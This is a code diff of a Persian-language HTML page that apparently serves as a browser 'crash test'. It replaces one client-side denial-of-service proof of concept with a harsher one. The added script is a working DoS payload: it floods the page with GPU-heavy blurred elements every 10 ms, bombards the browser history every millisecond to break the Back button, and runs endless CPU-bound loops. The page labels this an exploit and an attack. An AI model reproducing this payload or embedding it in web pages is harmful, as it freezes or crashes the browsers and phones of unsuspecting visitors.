@@ -2,107 +2,70 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS SECURITY TEST | REZA</title>
+    <title>NEXUS ULTIMATE CRASH TEST</title>
     <style>
-        body {
-            background-color: #020617;
-            color: #ff4444;
-            font-family: 'Tahoma', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .warning-box {
-            border: 2px solid #ff4444;
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-            background: rgba(255, 0, 0, 0.05);
-            box-shadow: 0 0 20px rgba(255, 68, 68, 0.2);
-            max-width: 90%;
-        }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        p { color: #ccc; font-size: 14px; margin-bottom: 20px; }
-        button {
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: transform 0.2s, background 0.3s;
-        }
-        button:hover {
-            background: #cc0000;
-            transform: scale(1.05);
-        }
-        #status {
-            margin-top: 20px;
-            color: #00f2fe;
-            font-family: monospace;
+        body { background: #000; color: #00f2fe; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn-crash { 
+            background: linear-gradient(45deg, #ff0000, #990000); 
+            color: white; border: none; padding: 20px 40px; 
+            font-size: 20px; font-weight: bold; border-radius: 50px; 
+            cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.5);
         }
     </style>
 </head>
 <body>
 
-    <div class="warning-box">
-        <i class="fas fa-exclamation-triangle" style="font-size: 50px; margin-bottom: 15px;"></i>
-        <h1>تست پایداری مرورگر (PoC)</h1>
-        <p>این یک آزمایش امنیتی برای بررسی مدیریت منابع در مرورگر است.<br>اجرای این تست باعث <b>هنگ کردن گوشی یا بسته شدن مرورگر</b> می‌شود.</p>
-        
-        <button id="startTest">اجرای حمله DoS</button>
-        
-        <div id="status">وضعیت: آماده برای تست</div>
-    </div>
+    <h1>تست نفوذ: کرش کلی اپلیکیشن</h1>
+    <p>این کد موتور رندرینگ (GPU) را هدف قرار می‌دهد.</p>
+    
+    <button id="crashBtn" class="btn-crash">اجرای CRASH سنگین</button>
 
     <script>
-        document.getElementById('startTest').addEventListener('click', function() {
-            // نمایش پیام تایید
-            const confirmAction = confirm("هشدار: این کار باعث کرش تب می‌شود. آیا مطمئن هستید؟");
-            
-            if (confirmAction) {
-                document.getElementById('status').innerText = "در حال حمله به منابع سیستم...";
-                document.getElementById('status').style.color = "red";
-                
-                // شروع عملیات کرش بعد از ۵۰۰ میلی‌ثانیه
-                setTimeout(heavyCrash, 500);
+        document.getElementById('crashBtn').addEventListener('click', function() {
+            if(confirm("آیا برای کرش کامل اپلیکیشن آماده هستید؟")) {
+                startExploit();
             }
         });
 
-        function heavyCrash() {
-            console.log("Crash sequence started...");
-            
-            let storage = [];
-            
-            // ۱. اشغال رم و پردازنده به صورت همزمان
+        function startExploit() {
+            // ۱. ایجاد نشت حافظه گرافیکی (Graphics Memory Leak)
+            // ایجاد هزاران المان با سایه و فیلترهای سنگین که GPU را قفل می‌کند
             setInterval(() => {
-                // ایجاد بلاک‌های سنگین که قابل بهینه‌سازی نباشند
-                for(let i = 0; i < 100; i++) {
-                    let block = new Array(1000000).fill(Math.random()).join('##');
-                    storage.push(block);
-                    
-                    // درگیر کردن موتور رندرینگ مرورگر
+                for(let i = 0; i < 500; i++) {
                     let div = document.createElement('div');
-                    div.style.position = 'fixed';
-                    div.innerText = block.substring(0, 10);
+                    div.style.cssText = `
+                        position: fixed;
+                        top: ${Math.random()*100}%;
+                        left: ${Math.random()*100}%;
+                        width: 100px; height: 100px;
+                        box-shadow: 0 0 100px 50px red;
+                        backdrop-filter: blur(50px);
+                        border-radius: 50%;
+                        z-index: ${i};
+                    `;
                     document.body.appendChild(div);
                 }
-                
-                // ۲. حلقه فریز کننده نهایی (Infinite Loop)
-                // وقتی مصرف رم بالا رفت، پردازنده را قفل می‌کنیم
-                if (storage.length > 10) {
-                    while(true) {
-                        Math.atan2(Math.random(), Math.random());
-                    }
+            }, 10);
+
+            // ۲. بمباران تاریخچه (History Bomb)
+            // این کار باعث می‌شود دکمه Back گوشی هم از کار بیفتد و مرورگر هنگ کند
+            setInterval(() => {
+                window.history.pushState(null, "", "?crash=" + Math.random());
+            }, 1);
+
+            // ۳. حلقه مرگ (Infinite Recursion & Processing)
+            // این بخش پردازنده را به ۱۰۰٪ می‌رساند تا سیستم‌عامل دستور بسته شدن برنامه را صادر کند
+            function crashLoop() {
+                let x = "REZA_CRASH".repeat(10000);
+                console.log(x);
+                // فراخوانی بازگشتی فوق سریع
+                setTimeout(crashLoop, 0);
+                while(true) {
+                    Math.sqrt(Math.random() * 999999);
                 }
-            }, 50);
+            }
+            
+            crashLoop();
         }
     </script>
 </body>
